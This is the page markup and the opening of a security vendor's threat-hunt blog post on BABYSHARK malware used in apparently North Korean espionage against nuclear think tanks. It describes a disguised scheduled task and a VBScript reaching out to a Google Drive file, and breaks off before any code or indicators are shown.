class="sub-menu-item-main"><a href="/blog" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9599aec9aca24cc38ed0787b9cf7af2a" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Blog</h6></div></a><a href="/upcoming-events" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F71184ce1c7ea4e40aeed46b2b1caa956" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Upcoming Events</h6></div></a><a href="https://support.huntress.io/hc/en-us" target="_blank" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd878e498b479437fb17af8599281c501" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Support Documentation</h6></div></a><a href="/integrations" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2b996be85228451f95f093c5387c229a" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Integrations</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray flex-row hide-tablet"><div class="submenu-text-block no-border">Produced by Huntress</div><div class="sub-menu-item-main"><a href="/tradecraft-tuesday" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-icon-wrapper large-icon"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe39cd53f6f734c9fb9c75943e16a2f1f" alt="" class="submenu-desktop-icon large-icon"/></div></a><a href="/firesidechat" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-icon-wrapper large-icon"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Febc3adfc1175461e8b12d0fd6532ce26" alt="" class="submenu-desktop-icon large-icon"/></div></a><a href="/product-lab-channel" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block"><div class="submenu-icon-wrapper large-icon"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Faed4732478f64b30acfc34fbdf4dd9ff" alt="" class="submenu-desktop-icon large-icon"/></div></a></div></div><div class="nav-dropdown-column background-color-gray show-tablet"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa895b30051794852b24aa18710f517e1" loading="lazy" alt="Huntress teal logo" class="platform-nav-image"/><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">The Huntress Threat Report</h6><div class="submenu-text-block-2">Try Huntress for free and <br/>deploy in minutes to start <br/>fighting threats.</div></div><a href="/demo" class="secondary-button w-inline-block"><div class="secodnary-button-text">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></div></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu w-dropdown w--nav-dropdown-open"><div class="menu-link-container w-dropdown-toggle w--nav-dropdown-toggle-open" aria-controls="w-dropdown-list-4" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">About</div><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" alt="Green arrow" class="menu-link-icon"/></div></div><div class="nav-dropdown-main-menu-mobile"><div class="sub-menu-dropdown-mobile hidden"><div class="sub-menu-link-container-mobile back js-menu-click-back w-button">Back</div><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block first">About Huntress</div><div class="sub-menu-item-main"><a href="/company/our-company" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa41cf78d4c9d4d4eb183c881deaa3c17" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Our Story</h6></div></a><a href="/company/leadership" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feaa35d4f1c7b42c789e587ecd7797b1a" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Leadership</h6></div></a><a href="/company/press" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fde090186c37343fd9e65dc6c6d65b691" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Latest News</h6></div></a><a href="/awards-and-accolades" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F107b70abda5841439fca3a13a02929cf" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Awards</h6></div></a></div></div><div class="nav-dropdown-column"><div class="spacer-32"></div><div class="sub-menu-item-main"><a href="/company/careers" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8f51f4c3ba104f94921e0584294c9bde" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Careers</h6></div></a><a href="/upcoming-events" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1af4796442c046f58fd94a8e484e6ad1" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Upcoming Events</h6></div></a><a href="/contact-us" class="sub-menu-item-2 single-row w-inline-block"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ffae29f3a7d0e45bf9bc1403cb7722f81" alt="SAT icon" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Contact Us</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray"><div class="submenu-text-block no-border hide-tablet">Featured Success Story</div><a href="https://cdn.builder.io/o/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F659979229f5449f28c49a65895b9d2ef?alt=media&amp;token=e87850ca-2ec6-4625-a6d9-b2e8a487f1ad&amp;apiKey=3eb6f92aedf74f109c7b4b0897ec39a8" target="_blank" class="sub-menu-nav w-inline-block"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fccbc23d75b9640b69566b916ea6f832a" loading="lazy" alt="Huntress Cybersecurity" class="platform-nav-image last-column"/></a><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">Key Methods</h6><div class="submenu-text-block-2"><p>When a mass-isolation event hit, Key Methods realized they were flying blind. See how Huntress Managed SIEM gave them the visibility they needed.</p></div></div><a href="https://cdn.builder.io/o/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F659979229f5449f28c49a65895b9d2ef?alt=media&amp;token=e87850ca-2ec6-4625-a6d9-b2e8a487f1ad&amp;apiKey=3eb6f92aedf74f109c7b4b0897ec39a8" target="_blank" class="secondary-button w-inline-block"><div class="secodnary-button-text">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></div></div></li><li class="main-menu-button-nav"><a href="/start-trial" class="button-primary navigation-button is-mobile w-button">Free Trial</a></li></ul></nav></div></div></header><div class="page-wrapper"><div class="builder-component builder-component-65f3299e49a461b4b9c729ba" data-name="page" data-source="Rendered by Builder.io"><div class="builder-content" builder-content-id="65f3299e49a461b4b9c729ba" builder-model="page"><div data-builder-component="page" data-builder-content-id="65f3299e49a461b4b9c729ba"><style data-emotion-css="h47494">.css-h47494{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:stretch;-webkit-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;}</style><div class="builder-blocks css-h47494" builder-type="blocks"><style data-emotion-css="4hp89i">.css-4hp89i.builder-block{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;box-sizing:border-box;}</style><div class="builder-block builder-ddebc027a2b547be8bb340dc4719efa5 builder-has-component css-4hp89i" builder-id="builder-ddebc027a2b547be8bb340dc4719efa5"><section class="blog-banner-section"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9f33356fc04f46a2ac4a68753ba41658" loading="eager" alt="" class="landing-banner-shape-1 blog-listing-landing-banner-shape-1"/><div class="w-layout-blockcontainer container-width-1143 w-container"><div class="blog-listing-banner-wrapper"><div class="blog-listing-banner-main-breadcrumb-wrap"><div class="breadcrumb contained"><a href="/" class="breadcrumb-link level-1">Home</a><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="" class="breadcrumb-icon"/><a href="/blog" class="breadcrumb-link level-2">Blog</a><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="" class="breadcrumb-icon"/><div class="breadcrumb-text">Targeted APT Activity: BABYSHARK Is Out for Blood</div></div></div><div class="blog-listing-heading-inner"><div class="landing-banner-heading blog-landing-banner-heading"><div class="breadcrumb blog-date-breadcrumb mobile"><div class="published-text">Published:</div><a href="/" class="breadcrumb-link breadcrumb-link-back">March 1, 2022</a></div><h1 class="landing-banner-heading-h1 blog">Targeted APT Activity: BABYSHARK Is Out for Blood</h1><div class="attribution-container"><div class="author-container"><div class="author-wrap-text">By: </div><div class="authors-wrapper"><div fs-cmsnest-collection="authors" fs-cmsnest-element="template-reference" role="list" class="authors-list "><div role="listitem" class="author-item "><a href="/authors/john-hammond" class="author-link w-inline-block"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0ebcc8e098b842e3b6c5d44ae153b485" loading="lazy" width="40" height="40" alt="" class="author-profile" style="width:40px;height:40px"/><div class="author-name blog-single">John Hammond</div></a></div></div></div></div></div></div></div><div class="blog-listing-inner-image-wrap"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd57bfd4fcc4b4b0f8685dcd9308d7d98" loading="lazy" alt="" class="blog-listing-banner-image"/></div></div></div><div class="social-share-icon-mobile"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe499a4a7ecac4052ab9e5c194b638f16" loading="lazy" alt="Share icon"/></div></section><section class="blog-detail-content-section"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc2118b00ed614bbf83f96f25de0beaf8" loading="eager" alt="Glitch effect" class="landing-banner-shape-8 blog-detail-landing-banner-shape-8"/><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc2118b00ed614bbf83f96f25de0beaf8" loading="lazy" alt="Glitch effect" class="landing-banner-shape-8 blog-detail-landing-banner-glitch-2"/><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0658aac7c84b4f7e9a7c7b2a5b519b28" loading="lazy" alt="Glitch effect" class="landing-banner-shape-8 blog-right-glitch"/><div class="w-layout-blockcontainer container-width-1143 w-container"><div class="blog-detail-content-wrapper"><div class="blog-main-section"><div class="post-wrapper"><div class="blog-post-summary-main"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ffe85f84d0b0c4f9f8743167664735836" loading="eager" alt="Glitch banner" class="blog-post-summary-main-glitch-top medium-zoom-image"/><div fs-richtext-sanitize="true" fs-richtext-element="rich-text" class="blog-post-summary first w-richtext"><p><strong>tl;dr: </strong>This blog follows the ThreatOps investigation of targeted DPRK (North Korean) backed cyber espionage efforts against Nuclear Think Tanks. It details the threat hunt from beginning to end, including how our ThreatOps analysts found the threat, how our team peeled back the layers to analyze the malicious activity and how the threat actors phished their way into the partner&#x27;s network in the first place. Scroll to the bottom for indicators of compromise.</p><p>On February 16, Huntress discovered malicious and targeted advanced persistent threat (APT) activity within a <a href="/trial" target="_blank" data-discover="true">trialing partner</a> organization. This activity aligns with known tradecraft attributed to North Korean threat actors targeting national security think tanks.</p><p>The uncovered malware family, dubbed <a href="https://attack.mitre.org/software/S0414/" target="_blank">BABYSHARK</a> by other researchers, is used by a DPRK state-sponsored threat actor. This variant was significantly customized and tailored to the specific victim environment, indicating a targeted attack. </p><p>In this blog, we&#x27;ll pull back the curtain on the technical details, our internal process of investigation and the lessons learned for the greater security community.</p><h2>Right of Boom and Backwards</h2><p>This story begins with our tried-and-true service: <a href="/defenders-handbook/persistence-in-cybersecurity" target="_blank" data-discover="true">detecting persistence</a>, or how hackers establish and maintain access to their victim. </p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:813px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="813px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435" type="image/webp"/><style data-emotion-css="2qdlcf">.css-2qdlcf{opacity:1;-webkit-transition:opacity 0.2s ease-in-out;transition:opacity 0.2s ease-in-out;object-fit:cover;object-position:center;}</style><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F02bc0a10d51c49f787f4e0b818341435"/></picture></div></figure><p>Discovering persistence mechanisms keys us in that there was <em>undeniably </em>malicious threat actor behavior. We start with this scene of the crime, and then work backward, unveiling new clues and breadcrumbs to uncover the full picture. </p><p>Once our 24/7 Security analysts identified the activity, we began an investigation to identify how deep the rabbit hole went.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1470px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1470px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1ffa58131e68463ba7e0dea3fcef11df"/></picture></div></figure><p>Our initial discovery was a scheduled task, masquerading with the name <span class="highlight">GoogleUpdater</span> that ran a <a href="https://gist.github.com/JohnHammond/7ed632eb8686ca86b6d8586db4ffc0ba" target="_blank"><strong>VBScript script </strong><span class="highlight">qwert.vbs</span></a>. This is a commonly used technique (<a href="https://attack.mitre.org/techniques/T1036/" target="_blank">MITRE ATT&amp;CK T1035.005</a>) to blend in and avoid detection by sounding like something legitimate—in this case, Google. Using a legitimate file (<span class="highlight">wscript.exe</span>) to run the malicious script further helps to avoid detection that is based on scanning of the binary that is running. </p><p><span class="highlight">qwert.vbs</span> included code to reach out to a Google Drive file. </p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1610px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1610px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff8b0b3ad015a4216b2ad019ee472cc87"/></picture></div></figure><p>Viewing this Google Drive file, it turns out to be completely blank: an empty file. Note the lengthy filename at the very top of the display, however. </p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1124px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1124px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0444476a232f4db1b93eb8532d20ec50"/></picture></div></figure><p>Downloading the page with <span class="highlight">curl</span>, we can see the HTML source of the Google Drive page—which does not appear to be overtly malicious upon first glance. But taking a closer look, we uncovered some odd “markers” in the lengthy file name displayed.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:742px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="742px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9682a8d206a6425ea38a0125b8237254" 